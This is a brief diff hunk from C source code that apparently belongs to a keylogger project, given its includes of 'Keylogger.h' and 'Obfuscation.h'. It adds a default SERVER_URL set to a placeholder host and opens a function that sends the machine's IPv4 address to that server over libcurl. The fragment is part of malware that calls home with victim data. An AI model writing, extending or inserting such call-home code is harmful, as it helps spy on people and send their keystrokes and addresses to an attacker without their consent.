@@ -18,6 +18,9 @@
 #include "Obfuscation.h"
 #include "Keylogger.h"
 
+#ifndef SERVER_URL
+#define SERVER_URL "http://default-server.com"
+#endif
 
 int sendIpv4ToServer(const char* serverUrl, const char* ipv4Address) {
 	CURL* curl;
